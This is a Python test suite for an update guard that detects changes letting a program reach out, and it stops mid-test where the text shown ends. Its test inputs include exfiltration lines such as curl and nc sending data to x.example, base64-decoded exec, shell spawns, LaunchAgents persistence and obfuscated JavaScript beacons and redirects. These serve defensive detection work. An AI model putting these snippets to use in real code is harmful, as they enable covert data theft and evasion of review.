"""The check before an update is installed (update_guard.py, updates.py): a change that lets the program reach out is found --
plainly written or hidden --, a change that does not is not; an update with findings waits and is installed only with an
approval for exactly its files, from an archive and in a git clone. All with made-up code; nothing is fetched."""
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import update_guard as G   # noqa: E402
import updates             # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def program() -> dict:
    """Kontor's own files as an update would install them."""
    out = {}
    for root, dirs, files in os.walk(ROOT):
        dirs[:] = [d for d in dirs if d not in ("tests", "docs", "node_modules", "__pycache__") and not d.startswith(".")]
        for fn in files:
            rel = os.path.relpath(os.path.join(root, fn), ROOT).replace(os.sep, "/")
            if G.installable(rel):
                with open(os.path.join(root, fn), "rb") as f:
                    out[rel] = f.read()
    return out


def kinds(found) -> set:
    return {f["kind"] for f in found}


# a small program of the same build as Kontor: a part that fetches (checking the address), one that starts a helper, pages
SMALL = {
    "VERSION": b"1.0.0\n",
    "kontor.py": b"import fetch\nimport work\n\n\ndef main():\n    return work.total([1, 2]) + len(fetch.get('https://api.example.org/v'))\n",
    "fetch.py": (b"import urllib.request\n\nALLOWED = ('api.example.org',)\n\n\ndef allowed(url):\n    return url.split('/')[2] in ALLOWED\n\n\n"
                 b"def get(url):\n    if not allowed(url):\n        raise ValueError(url)\n    return urllib.request.urlopen(url, timeout=5).read()\n"),
    "tools.py": (b"import os\nimport subprocess\n\nHELPER = os.path.join(os.path.dirname(__file__), 'helper.swift')\n\n\n"
                 b"def run(binary, *args):\n    return subprocess.run([binary] + list(args), capture_output=True)\n\n\n"
                 b"def build():\n    return run('swiftc', HELPER)\n\n\ndef show(path):\n    subprocess.run(['open', '-R', path])\n"),
    "work.py": b"import json\nimport os\n\n\ndef total(xs):\n    return sum(xs)\n\n\ndef save(path, obj):\n    with open(path, 'w') as f:\n        json.dump(obj, f)\n",
    "updates.py": b"import update_guard\n\n\ndef install():\n    return update_guard\n",
    "update_guard.py": b"HARMLESS = ('json',)\n",
    "helper.swift": b"print(1)\n",
    "web/app.js": b"const api = p => fetch(p);\nfunction go(h) { location.hash = h; }\nfunction link() { return '<a href=\"https://docs.example.org/x\">x</a>'; }\n",
    "web/index.html": b"<html><head><script src=\"/app.js\"></script></head><body></body></html>\n",
    "web/app.css": b".a { color: red; }\n",
    "docs/help.md": b"# Help\n",
}


def changed(base=None, **files) -> dict:
    """The program with some files replaced or added: name__sub for a folder, _py/_js/... for the ending; a function gets the
    old content, bytes are appended, None removes."""
    new = dict(SMALL if base is None else base)
    for key, val in files.items():
        rel = key.replace("__", "/")
        for end in ("py", "js", "html", "css", "swift", "command", "pyc", "md", "jxa", "sh"):
            if rel.endswith("_" + end):
                rel = rel[:-len(end) - 1] + "." + end
        if val is None:
            new.pop(rel, None)
        elif callable(val):
            new[rel] = val(new.get(rel, b""))
        else:
            new[rel] = new.get(rel, b"") + val
    return new


class Found(unittest.TestCase):
    """Ways a change could let the program reach out -- each is named (which kind matters less than that it is)."""

    def found(self, **files):
        return G.compare(SMALL, changed(**files))

    def test_nothing_in_the_same_program(self):
        self.assertEqual(G.compare(SMALL, dict(SMALL)), [])

    def test_plainly_written(self):
        for name, files, kind in (
                ("a request", {"work_py": b"\nimport urllib.request\n\n\ndef send(d):\n    urllib.request.urlopen('https://x.example/u', data=d)\n"}, "module"),
                ("a connection", {"work_py": b"\nimport socket\n\n\ndef send(d):\n    socket.create_connection(('x.example', 443)).send(d)\n"}, "module"),
                ("a program", {"work_py": b"\nimport subprocess\n\n\ndef send(d):\n    subprocess.run(['curl', '-d', d, 'x.example'])\n"}, "module"),
                ("os.system", {"work_py": b"\n\ndef send(d):\n    os.system('nc x 1 < ' + d)\n"}, "call"),
                ("os.popen", {"work_py": b"\n\ndef send(d):\n    return os.popen(d).read()\n"}, "call"),
                ("os.execv", {"work_py": b"\n\ndef send(d):\n    os.execv(d, [d])\n"}, "call"),
                ("ctypes", {"work_py": b"\nimport ctypes\n\n\ndef send():\n    ctypes.CDLL(None).system(b'x')\n"}, "module"),
                ("pickle", {"work_py": b"\nimport pickle\n\n\ndef load(b):\n    return pickle.loads(b)\n"}, "module"),
                ("webbrowser", {"work_py": b"\nimport webbrowser\n\n\ndef send(u):\n    webbrowser.open(u)\n"}, "module"),
                ("a package from elsewhere", {"work_py": b"\nimport requests\n"}, "module"),
                ("a part that is not installed", {"work_py": b"\nimport tests.fixtures\n"}, "module"),
                ("a handler that sends the log", {"work_py": b"\nimport logging.handlers\n\n\ndef on():\n    return logging.handlers.HTTPHandler('x.example', '/u')\n"}, "call"),
                ("everything of a part", {"work_py": b"\nfrom os import *\n"}, "module"),
                ("one risky name of a harmless part", {"work_py": b"\nfrom os import system as quiet\n"}, "module")):
            with self.subTest(name):
                self.assertIn(kind, kinds(self.found(**files)))

    def test_hidden(self):
        for name, files in (
                ("the part looked up as text", {"work_py": b"\n\ndef send():\n    return __import__('so' + 'cket')\n"}),
                ("importlib", {"work_py": b"\nimport importlib\n\n\ndef send():\n    return importlib.import_module('sock' + 'et')\n"}),
                ("a part through another part", {"work_py": b"\nimport shutil\n\n\ndef send(d):\n    shutil.os.system(d)\n"}),
                ("a part through another part, deeper", {"work_py": b"\nimport logging.handlers\n\n\ndef send():\n    return logging.handlers.socket\n"}),
                ("the list of loaded parts", {"work_py": b"\nimport sys\n\n\ndef send():\n    return sys.modules['socket']\n"}),
                ("a name looked up as text", {"work_py": b"\n\ndef send(o, n):\n    return getattr(o, n)\n"}),
                ("a name looked up as text, fixed but telling", {"work_py": b"\n\ndef send(o):\n    return getattr(o, 'system')\n" if False else b"\n\ndef send():\n    return getattr(os, 'sys' + 'tem')\n"}),
                ("getattr handed on", {"work_py": b"\nimport functools\n\n\ndef send(o, names):\n    return functools.reduce(getattr, names, o)\n"}),
                ("code from text", {"work_py": b"\nimport base64\n\n\ndef send(t):\n    exec(base64.b64decode(t))\n"}),
                ("eval", {"work_py": b"\n\ndef send(t):\n    return eval(t)\n"}),
                ("compile", {"work_py": b"\n\ndef send(t):\n    return compile(t, 'x', 'exec')\n"}),
                ("the insides of Python", {"work_py": b"\n\ndef send():\n    return ().__class__.__base__.__subclasses__()\n"}),
                ("a function's own surroundings", {"work_py": b"\n\ndef send():\n    return total.__globals__['os']\n"}),
                ("its surroundings by name", {"work_py": b"\n\ndef send():\n    return globals()['o' + 's']\n"}),
                ("a part handed on as a value", {"work_py": b"\n\ndef send(f):\n    return f(os)\n"}),
                ("a part under another name", {"work_py": b"\nquiet = os\n\n\ndef send(d):\n    quiet.system(d)\n"}),
                ("a part of a part under another name", {"work_py": b"\nquiet = os.system\n\n\ndef send(d):\n    quiet(d)\n"}),
                ("a part's own names as a table", {"work_py": b"\n\ndef send(d):\n    return os.__dict__['sys' + 'tem'](d)\n"}),
                ("operator.attrgetter", {"work_py": b"\nimport operator\n\n\ndef send(d):\n    return operator.attrgetter('sys' + 'tem')(d)\n"}),
                ("a part by its name without importing it", {"work_py": b"\n\ndef send(d):\n    return subprocess.run(d)\n"}),
                ("a package whose other half reaches out", {"work_py": b"\nimport http\n\n\ndef send(d):\n    http.client.HTTPConnection('m.x.example', 80).request('POST', '/c', d)\n"}),
                ("... by name", {"work_py": b"\nfrom http import client as quiet\n\n\ndef send():\n    return quiet.HTTPConnection('m.x.example', 80)\n"}),
                ("... listening", {"work_py": b"\nimport http\n\n\ndef listen():\n    return http.server.HTTPServer(('0.0.0.0', 9999), None)\n"}),
                ("a note of a value's kind turned into code", {"work_py": b"\nimport typing\n\n\nclass X:\n    a: 'print(1)'\n\n\ndef send():\n    return typing.get_type_hints(X)\n"}),
                ("a class built on a part", {"work_py": b"\nimport http.server\n\n\nclass S(http.server.HTTPServer):\n    pass\n"}),
                ("a table of the builtins", {"work_py": b"\n\ndef send(t):\n    return __builtins__['ev' + 'al'](t)\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)

    def test_what_is_there_already_used_differently(self):
        for name, files in (
                ("another argument for a program", {"tools_py": lambda b: b.replace(b"['open', '-R', path]", b"['open', path]")}),
                ("the helper's place moved", {"tools_py": lambda b: b.replace(b"'helper.swift'", b"'docs', 'help.md'")}),
                ("the allowed addresses widened", {"fetch_py": lambda b: b.replace(b"('api.example.org',)", b"('api.example.org', 'x.example')")}),
                ("the check of the address softened", {"fetch_py": lambda b: b.replace(b"return url.split('/')[2] in ALLOWED", b"return True")}),
                ("the check left out", {"fetch_py": lambda b: b.replace(b"    if not allowed(url):\n        raise ValueError(url)\n", b"")}),
                ("the open starter of programs, used from elsewhere", {"work_py": b"\nimport tools\n\n\ndef send(d):\n    tools.run('/usr/bin/curl', '-d', d, 'x')\n"}),
                ("... imported by name", {"work_py": b"\nfrom tools import run as quiet\n\n\ndef send(d):\n    quiet('/usr/bin/curl', d)\n"}),
                ("... in the same file", {"tools_py": b"\n\ndef send(d):\n    return run('/usr/bin/curl', d)\n"}),
                ("... kept under another name", {"work_py": b"\nimport tools\nquiet = tools.run\n"}),
                ("the allowed addresses replaced from outside", {"work_py": b"\nimport fetch\n\n\ndef send():\n    fetch.ALLOWED += ('x.example',)\n"}),
                ("the check replaced from outside", {"work_py": b"\nimport fetch\n\n\ndef send():\n    fetch.allowed = lambda u: True\n"}),
                ("... with setattr", {"work_py": b"\nimport fetch\n\n\ndef send():\n    setattr(fetch, 'allowed', len)\n"}),
                ("a setting of the file changed from inside a function", {"fetch_py": b"\n\ndef more():\n    global ALLOWED\n    ALLOWED = ALLOWED + ('x.example',)\n"}),
                ("the update check touched from outside", {"work_py": b"\nimport update_guard\n\n\ndef send():\n    update_guard.HARMLESS += ('socket',)\n"}),
                ("the update check changed", {"update_guard_py": b"HARMLESS = HARMLESS + ('socket',)\n"}),
                ("the installer changed", {"updates_py": b"\nX = 1\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)

    def test_places_and_addresses(self):
        for name, files, kind in (
                ("a start entry of macOS", {"work_py": b"\n\ndef send():\n    save(os.path.expanduser('~/Library/LaunchAgents/x.plist'), 1)\n"}, "place"),
                ("the shell's start file", {"work_py": b"\n\ndef send():\n    save(os.path.expanduser('~/.zshrc'), 1)\n"}, "place"),
                ("a folder that leaves the Mac", {"work_py": b"\nOUT = 'Library/Mobile Documents/x'\n"}, "place"),
                ("a new address in the program", {"work_py": b"\nWHERE = 'https://x.example/in'\n"}, "address"),
                ("a new address on a page", {"web__app_js": b"\nconst more = 'https://x.example/a';\n"}, "address"),
                ("an address without https:", {"web__index_html": b"<img src=\"//x.example/a.png\">\n"}, "address")):
            with self.subTest(name):
                self.assertIn(kind, kinds(self.found(**files)))
        # an address that is there already, written again, is nothing new
        self.assertEqual(self.found(web__app_js=b"\nconst again = 'https://docs.example.org/y';\n"), [])

    def test_pages(self):
        for name, files in (
                ("leaving to another address", {"web__app_js": b"\nfunction send(d) { location.href = u + d; }\n"}),
                ("... assigned to location itself", {"web__app_js": b"\nfunction send(d) { location = u + d; }\n"}),
                ("location.assign", {"web__app_js": b"\nfunction send(d) { location.assign(u + d); }\n"}),
                ("a new window", {"web__app_js": b"\nfunction send(d) { window.open(u + d); }\n"}),
                ("a new window, plain", {"web__app_js": b"\nfunction send(d) { open(u + d); }\n"}),
                ("a new window under another name", {"web__app_js": b"\nconst quiet = window.open;\nfunction send(h, d) { quiet('htt' + 'ps://' + h + '/x?d=' + d); }\n"}),
                ("... plain", {"web__app_js": b"\nconst quiet = open;\nfunction send(h, d) { quiet(h + d); }\n"}),
                ("a link built with Object.assign and clicked", {"web__app_js": b"\nfunction send(h, d) { const a = document.createElement('a'); Object.assign(a, {href: 'htt' + 'ps://' + h + '/x?' + d}); document.body.appendChild(a); a.click(); }\n"}),
                ("a click made by the page", {"web__app_js": b"\nfunction send(a) { a.click(); }\n"}),
                ("a link clicked by the page", {"web__app_js": b"\nfunction send(d) { const a = document.createElement('a'); a.href = u + d; a.click(); }\n"}),
                ("a picture's address set", {"web__app_js": b"\nfunction send(d) { new Image().src = u + d; }\n"}),
                ("setAttribute with an address", {"web__app_js": b"\nfunction send(el, d) { el.setAttribute('href', u + d); }\n"}),
                ("a socket", {"web__app_js": b"\nfunction send() { return new WebSocket(u); }\n"}),
                ("a beacon", {"web__app_js": b"\nfunction send(d) { navigator.sendBeacon(u, d); }\n"}),
                ("a connection between browsers", {"web__app_js": b"\nfunction send() { return new RTCPeerConnection(); }\n"}),
                ("a refresh to another page", {"web__app_js": b"\nfunction send(d) { document.head.innerHTML += '<meta http-equiv=\"refresh\" content=\"0;url=' + d + '\">'; }\n"}),
                ("a name looked up as text", {"web__app_js": b"\nfunction send(d) { window['loc' + 'ation'] = d; }\n"}),
                ("a link element", {"web__app_js": b"\nfunction send() { return document.createElement('link'); }\n"}),
                ("a frame", {"web__app_js": b"\nfunction send(d) { return '<iframe src=\"' + d + '\">'; }\n"}),
                ("code from text", {"web__app_js": b"\nfunction send(t) { return eval(t); }\n"}),
                ("a function from text", {"web__app_js": b"\nfunction send(t) { return new Function(t)(); }\n"}),
                ("a script from elsewhere", {"web__index_html": b"<script src=\"//x.example/a.js\"></script>\n"}),
                ("a style sheet reaching out", {"web__app_css": b".x { background:url(//x.example/a.png); }\n"}),
                ("a style sheet importing", {"web__app_css": b"@import 'https://x.example/a.css';\n"}),
                ("a request to a full address", {"web__app_js": b"\nfetch('https://x.example/a');\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)

    def test_files_kontor_cannot_read(self):
        for name, files in (
                ("a helper changed", {"helper_swift": b"print(2)\n"}),
                ("a new script", {"start_command": b"#!/bin/sh\ncurl x\n"}),
                ("a new shell script", {"tools__run_sh": b"curl x\n"}),
                ("translated Python without its text", {"fast_pyc": b"\x00\x01"}),
                ("a program without ending", {"runme": b"\xcf\xfa\xed\xfe"}),
                ("Python no reader understands", {"work_py": b"\ndef (:\n"})):
            with self.subTest(name):
                self.assertTrue({"file", "unreadable"} & kinds(self.found(**files)), name)

    def test_what_is_shown(self):
        f = self.found(work_py=b"\nimport subprocess\n\n\ndef send(d):\n    subprocess.run(['curl', '-d', d, 'x.example'])\n")
        call = [x for x in f if x["kind"] == "call"][0]
        self.assertEqual((call["file"], call["new"]), ("work.py", True)); self.assertIn("subprocess.run(['curl'", call["what"]); self.assertIn("send", call["what"])
        f = self.found(tools_py=lambda b: b.replace(b"['open', '-R', path]", b"['open', path]"))
        self.assertEqual([(x["kind"], x["file"], x["new"]) for x in f], [("call", "tools.py", False)])
        self.assertLessEqual(max(len(x["what"]) for x in f), 160)



class Reviewed(unittest.TestCase):
    """What an independent review before 3.17 found open: each case was a change without a finding."""

    def found(self, **files):
        return G.compare(SMALL, changed(**files))

    def test_python_reached_through_the_programs_own_parts(self):
        """tools.py imports os and subprocess, fetch.py urllib.request: another part reaching them through these is no way around."""
        for name, files in (
                ("a program through another part", {"work_py": b"\nimport tools\n\n\ndef send(a):\n    tools.subprocess.Popen(['/bin/sh', '-c', a])\n"}),
                ("a request through another part", {"work_py": b"\nimport fetch\n\n\ndef send(u, d):\n    fetch.urllib.request.urlopen(u, d)\n"}),
                ("os.system through another part", {"work_py": b"\nimport tools\n\n\ndef send(a):\n    tools.os.system(a)\n"}),
                ("taken from another part by name", {"work_py": b"\nfrom tools import subprocess as sp\n"}),
                ("... and used", {"work_py": b"\nfrom tools import subprocess as sp\n\n\ndef send(a):\n    sp.run(a)\n"}),
                ("under the other part's own quiet name", {"tools_py": b"\nimport subprocess as quiet\n", "work_py": b"\nimport tools\n\n\ndef send(a):\n    tools.quiet.Popen(a)\n"}),
                ("... taken by name", {"tools_py": b"\nimport subprocess as quiet\n", "work_py": b"\nfrom tools import quiet\n\n\ndef send(a):\n    quiet.Popen(a)\n"}),
                ("the other part under another name", {"tools_py": b"\nimport subprocess as quiet\n", "work_py": b"\nimport tools\nm = tools\n\n\ndef send(a):\n    m.quiet.Popen(a)\n"}),
                ("through two parts", {"tools_py": b"\nimport subprocess as quiet\n", "fetch_py": b"\nimport tools as t2\n", "work_py": b"\nimport fetch\n\n\ndef send(a):\n    fetch.t2.quiet.Popen(a)\n"}),
                ("the other part's names as a table", {"work_py": b"\nimport tools\n\n\ndef send(a):\n    return tools.__dict__['subprocess']\n"}),
                ("the other part's file", {"work_py": b"\nimport tools\n\n\ndef where():\n    return tools.__file__\n"}),
                ("a part of Python handed on through another part", {"work_py": b"\nimport tools\n\n\ndef send(f):\n    return f(tools.os)\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)
        # the control: written plainly it was found before, too
        self.assertEqual(len(self.found(work_py=b"\nimport subprocess\n\n\ndef send(a):\n    subprocess.Popen(['/bin/sh', '-c', a])\n")), 2)
        for name, files in (
                ("a harmless function of Python through another part", {"work_py": b"\nimport tools\n\n\ndef base(p):\n    return tools.os.path.basename(p)\n"}),
                ("another part's own setting", {"work_py": b"\nimport tools\n\n\ndef where():\n    return tools.HELPER\n"}),
                ("another part's own function", {"work_py": b"\nimport fetch\n\n\ndef ok(u):\n    return fetch.allowed(u)\n"})):
            with self.subTest(name):
                self.assertEqual(self.found(**files), [], name)

    def test_a_file_that_takes_the_place_of_another(self):
        """A folder with the name of a part is loaded instead of the file; a file with the name of a part of Python instead of
        that part; some files Python loads by itself."""
        for name, more in (
                ("a folder instead of the check", {"update_guard/__init__.py": b"def compare(a, b):\n    return []\n"}),
                ("a folder instead of another part", {"fetch/__init__.py": b"def get(url):\n    return b''\n"}),
                ("a folder instead of a part of Python", {"json/__init__.py": b"def loads(s):\n    return {}\n"}),
                ("a file instead of a part of Python", {"hmac.py": b"def compare_digest(a, b):\n    return True\n"}),
                ("... of its insides", {"_socket.py": b"X = 1\n"}),
                ("loaded at every start of Python", {"sitecustomize.py": b"X = 1\n"}),
                ("... for the user", {"usercustomize.py": b"X = 1\n"}),
                ("the program folder as a package", {"__init__.py": b"X = 1\n"}),
                ("the program folder started as a program", {"__main__.py": b"X = 1\n"}),
                ("the same name in other letters (the Mac's disks take them for one file)", {"Fetch.py": b"def get(url):\n    return b''\n"}),
                ("... of the check", {"Update_Guard.py": b"HARMLESS = ('json', 'socket')\n"}),
                ("... with a letter that only looks different", {"\u017fervice.py": b"X = 1\n", "service.py": b"X = 2\n"})):
            with self.subTest(name):
                found = G.compare(SMALL, dict(SMALL, **more))
                self.assertIn("shadow", kinds(found), name)
        # the check's file gone, or replaced by one of another spelling: shown
        self.assertIn("guard", kinds(G.compare(SMALL, changed(update_guard_py=None))))
        new = changed(update_guard_py=None); new["Update_Guard.py"] = SMALL["update_guard.py"]
        self.assertTrue({"guard", "shadow"} <= kinds(G.compare(SMALL, new)))
        # a new part of the program in a folder of its own is nothing to ask about
        self.assertEqual(G.compare(SMALL, dict(SMALL, **{"plans/__init__.py": b"", "plans/year.py": b"def f(x):\n    return x * 12\n"})), [])

    def test_writing_into_the_programs_own_folder(self):
        for name, files in (
                ("appending to a program file", {"work_py": b"\nimport base64\n\n\ndef grow(t):\n    with open(os.path.join(os.path.dirname(__file__), 'fet' + 'ch.py'), 'a') as f:\n        f.write(base64.b64decode(t).decode())\n"}),
                ("... the path kept in a name first", {"work_py": b"\n\ndef grow(t):\n    here = os.path.dirname(os.path.abspath(__file__))\n    p = os.path.join(here, 'x.py')\n    f = open(p, 'w')\n    f.write(t)\n"}),
                ("... from a name at the top of the file", {"work_py": b"\nHOME = os.path.dirname(__file__)\n\n\ndef grow(t):\n    open(HOME + '/x.py', 'w').write(t)\n"}),
                ("... from another part's name", {"work_py": b"\nimport tools\n\n\ndef grow(t):\n    open(os.path.join(os.path.dirname(tools.HELPER), 'x.py'), 'w').write(t)\n"}),
                ("... through a function that writes where it is told", {"work_py": b"\n\ndef grow(t):\n    save(os.path.join(os.path.dirname(__file__), 'x.py'), t)\n"}),
                ("... through two", {"work_py": b"\n\ndef put(p, t):\n    save(p, t)\n\n\ndef grow(t):\n    put(os.path.join(os.path.dirname(__file__), 'x.py'), t)\n"}),
                ("... through a function of another part", {"tools_py": b"\nimport work\n\n\ndef grow(t):\n    work.save(os.path.dirname(HELPER) + '/x.py', t)\n"}),
                ("... through a function that says where the program is", {"work_py": b"\n\ndef here():\n    return os.path.dirname(__file__)\n\n\ndef grow(t):\n    open(here() + '/x.py', 'a').write(t)\n"}),
                ("a file copied there", {"work_py": b"\nimport shutil\n\n\ndef grow(src):\n    shutil.copy(src, os.path.dirname(__file__))\n"}),
                ("a file moved over a program file", {"work_py": b"\n\ndef grow(src):\n    os.replace(src, os.path.join(os.path.dirname(__file__), 'fetch.py'))\n"}),
                ("with pathlib", {"work_py": b"\nimport pathlib\n\n\ndef grow(t):\n    pathlib.Path(__file__).with_name('fetch.py').write_text(t)\n"}),
                ("the log written into a program file", {"work_py": b"\nimport logging\n\n\ndef grow():\n    return logging.FileHandler(os.path.join(os.path.dirname(__file__), 'x.py'))\n"}),
                ("from where the program was started", {"work_py": b"\nimport sys\n\n\ndef grow(t):\n    open(os.path.join(os.path.dirname(sys.argv[0]), 'x.py'), 'w').write(t)\n"})):
            with self.subTest(name):
                self.assertIn("self", kinds(self.found(**files)), name)
        for name, files in (
                ("reading beside the program", {"work_py": b"\n\ndef version():\n    with open(os.path.join(os.path.dirname(__file__), 'VERSION')) as f:\n        return f.read()\n"}),
                ("... in binary", {"work_py": b"\n\ndef version():\n    return open(os.path.join(os.path.dirname(__file__), 'VERSION'), 'rb').read()\n"}),
                ("writing where the caller says", {"work_py": b"\n\ndef keep(folder, obj):\n    save(os.path.join(folder, 'a.json'), obj)\n"}),
                ("writing into a folder of its own", {"work_py": b"\nimport tempfile\n\n\ndef keep(obj):\n    save(os.path.join(tempfile.gettempdir(), 'a.json'), obj)\n"})):
            with self.subTest(name):
                self.assertEqual(self.found(**files), [], name)

    def test_names_put_together(self):
        for name, files, kind in (
                ("a start entry from pieces", {"work_py": b"\n\ndef send():\n    save(os.path.expanduser('~/Library/' + 'Launch' + 'Agents/x.plist'), 1)\n"}, "place"),
                ("... behind something else", {"work_py": b"\n\ndef send(home):\n    save(home + '/Library/Launch' + 'Agents/x.plist', 1)\n"}, "place"),
                ("... in a text with gaps", {"work_py": b"\n\ndef send(home):\n    save('%s/Library/Launch%s/x.plist' % (home, 'Agents'), 1)\n"}, "place"),
                ("... in an f-text", {"work_py": b"\n\ndef send(home):\n    save(f\"{home}/Library/Launch{'Agents'}/x.plist\", 1)\n"}, "place"),
                ("... joined", {"work_py": b"\n\ndef send():\n    save(''.join(['~/Library/Launch', 'Agents', '/x.plist']), 1)\n"}, "place"),
                ("... as parts of a path", {"work_py": b"\n\ndef send(home):\n    save(os.path.join(home, '.zsh' + 'rc'), 1)\n"}, "place"),
                ("... from names", {"work_py": b"\nA = 'Launch'\nB = 'Agents'\n\n\ndef send(home):\n    save(home + '/Library/' + A + B, 1)\n"}, "place"),
                ("... written backwards", {"work_py": b"\n\ndef send(home):\n    save(home + '/Library/' + 'stnegAhcnuaL'[::-1], 1)\n"}, "place"),
                ("... as bytes", {"work_py": b"\n\ndef send(home):\n    save(home + '/Library/' + (b'Launch' + b'Agents').decode(), 1)\n"}, "place"),
                ("... wrapped", {"work_py": b"\nimport base64\n\n\ndef send(home):\n    save(home + '/Library/' + base64.b64decode('TGF1bmNoQWdlbnRz').decode(), 1)\n"}, "place"),
                ("an address from pieces", {"work_py": b"\nWHERE = 'htt' + 'ps://x.exa' + 'mple/in'\n"}, "address")):
            with self.subTest(name):
                self.assertIn(kind, kinds(self.found(**files)), name)

    def test_more_ways_to_start_a_program(self):
        for name, files in (
                ("os._execvpe", {"work_py": b"\n\ndef send(d):\n    os._execvpe(d, [d], {})\n"}),
                ("os._spawnvef", {"work_py": b"\n\ndef send(d):\n    os._spawnvef(0, d, [d], None, os.execv)\n"}),
                ("os.posix_spawnp", {"work_py": b"\n\ndef send(d):\n    os.posix_spawnp(d, [d], {})\n"}),
                ("os.spawnlp", {"work_py": b"\n\ndef send(d):\n    os.spawnlp(0, d, d)\n"}),
                ("os.execlpe", {"work_py": b"\n\ndef send(d):\n    os.execlpe(d, d, {})\n"}),
                ("os.forkpty", {"work_py": b"\n\ndef send():\n    return os.forkpty()\n"}),
                ("an exec of a later Python", {"work_py": b"\n\ndef send(d):\n    os.execveat(d, [d], {})\n"}),
                ("taken by name", {"work_py": b"\nfrom os import _execvpe as quiet\n"}),
                ("the insides of a harmless part", {"work_py": b"\nimport tempfile\n\n\ndef send(d):\n    tempfile._os.system(d)\n"}),
                ("code from text through a harmless part", {"work_py": b"\nimport tarfile\n\n\ndef send(t):\n    tarfile.bltn.exec(t)\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)
        self.assertEqual(self.found(work_py=b"\n\ndef stop():\n    os._exit(0)\n"), [])                # (as Kontor ends its service)

    def test_insides_of_python_by_a_name_put_together(self):
        for name, files in (
                ("a type's table, the name from pieces", {"work_py": b"\n\ndef send():\n    return type.__dict__['__sub' + 'classes__'](object)\n"}),
                ("... the name not fixed", {"work_py": b"\n\ndef send(n):\n    return type.__dict__[n](object)\n"}),
                ("... with get", {"work_py": b"\n\ndef send(o, n):\n    return o.__dict__.get(n)\n"}),
                ("... an object's own table, an inner name", {"work_py": b"\n\ndef send(o):\n    return o.__dict__['__cl' + 'ass__']\n"}),
                ("... through its class", {"work_py": b"\n\ndef send(o, n):\n    return o.__class__.__dict__[n]\n"}),
                ("an inner name as text", {"work_py": b"\nNAME = '__subclasses__'\n"}),
                ("... from pieces", {"work_py": b"\nNAME = '__sub' + 'classes__'\n"}),
                ("... in a text with gaps", {"work_py": b"\nNAME = '__%s__' % 'globals'\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)
        for name, files in (
                ("an object's own value by a fixed name", {"work_py": b"\n\ndef cached(o):\n    return o.__dict__.get('_cache')\n"}),
                ("... set", {"work_py": b"\n\ndef cached(o):\n    o.__dict__['_cache'] = 1\n"}),
                ("an object's own values", {"work_py": b"\n\ndef values(o):\n    return [v for k, v in o.__dict__.items() if not k.startswith('_')]\n"})):
            with self.subTest(name):
                self.assertEqual(self.found(**files), [], name)

    def test_pages_by_other_names(self):
        for name, files in (
                ("a link from pieces, clicked by a name as text", {"web__app_js": b"\nfunction send(u) { const d = document.createElement('div'); d.innerHTML = '<a hr' + 'ef=\"' + u + '\">x</a>'; d.firstChild['click'](); }\n"}),
                ("... the name kept apart", {"web__app_js": b"\nconst K = 'cl' + 'ick';\nfunction send(a) { a[K](); }\n"}),
                ("... the click taken without calling it", {"web__app_js": b"\nfunction send(a) { const c = a.click; c.call(a); }\n"}),
                ("location under another name", {"web__app_js": b"\nconst L = location;\nfunction send(u) { L.assign(u); }\n"}),
                ("... through window", {"web__app_js": b"\nconst L = window.location;\nfunction send(u) { L.assign(u); }\n"}),
                ("... handed on", {"web__app_js": b"\nfunction go(l, u) { l.assign(u); }\nfunction send(u) { go(location, u); }\n"}),
                ("window under another name", {"web__app_js": b"\nconst w = window;\nfunction send(u) { w.open(u); }\n"}),
                ("document under another name", {"web__app_js": b"\nlet d;\nd = document;\n"}),
                ("location.assign called indirectly", {"web__app_js": b"\nfunction send(u) { location.assign.call(location, u); }\n"}),
                ("code loaded later", {"web__app_js": b"\nfunction send(u) { return import(u); }\n"}),
                ("an address from pieces", {"web__app_js": b"\nconst u = 'htt' + 'ps://x.exa' + 'mple/a';\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)
        for name, files in (
                ("an element looked up", {"web__app_js": b"\nconst el = document.querySelector('#x'); const w = window.innerWidth;\n"}),
                ("a function of a list called", {"web__app_js": b"\nfunction all(items) { items[0].draw(); return items.map(i => i.name); }\n"}),
                ("a listener on the page", {"web__app_js": b"\ndocument.addEventListener('keydown', e => go(e.key)); window.addEventListener('resize', () => go('x'));\n"})):
            with self.subTest(name):
                self.assertEqual(self.found(**files), [], name)

    def test_helpers_comments_and_what_changes(self):
        base = dict(SMALL, **{"helper.swift": b"import Foundation\n// reads the amount\nlet a = 1   // one\nfunc run() {\n    print(a)\n}\n",
                              "bridge.jxa": b"// the bridge\nconst ALLOWED = {exportAccounts: true};\nfunction run(argv) {\n  if (!ALLOWED[argv[0]]) throw new Error('no');\n  return Application('MoneyMoney')[argv[0]]();\n}\n",
                              "setup.sh": b"#!/bin/bash\n# installs\nset -e\ncat <<TXT\n# shown to you\nTXT\necho done\n"})
        for name, files in (
                ("a comment line more", {"helper.swift": base["helper.swift"] + b"// more\n"}),
                ("a comment changed", {"helper.swift": base["helper.swift"].replace(b"// reads the amount", b"// reads it")}),
                ("a comment block", {"helper.swift": b"/* the helper\n   of Kontor */\n" + base["helper.swift"]}),
                ("indented differently, empty lines", {"helper.swift": base["helper.swift"].replace(b"    print(a)", b"\n\tprint(a)  ")}),
                ("the bridge: a comment line", {"bridge.jxa": base["bridge.jxa"] + b"// nothing else\n"}),
                ("a script: a comment line", {"setup.sh": base["setup.sh"].replace(b"# installs", b"# installs Kontor\n# (again)")})):
            with self.subTest(name):
                self.assertEqual(G.compare(base, dict(base, **files)), [], name)
        for name, files, added, removed in (
                ("a line of code more", {"helper.swift": base["helper.swift"] + b"print(2)\n"}, 1, 0),
                ("code behind a comment sign in a text", {"helper.swift": base["helper.swift"].replace(b"print(a)", b'print("// " + a)')}, 1, 1),
                ("a comment at the end of a line of code", {"helper.swift": base["helper.swift"].replace(b"let a = 1   // one", b"let a = 2   // one")}, 1, 1),
                ("a text over several lines is no comment", {"helper.swift": base["helper.swift"] + b'let t = """\n// kept\n"""\n'}, 3, 0),
                ("what the bridge lets through", {"bridge.jxa": base["bridge.jxa"].replace(b"exportAccounts: true", b"exportAccounts: true, createBankTransfer: true")}, 1, 1),
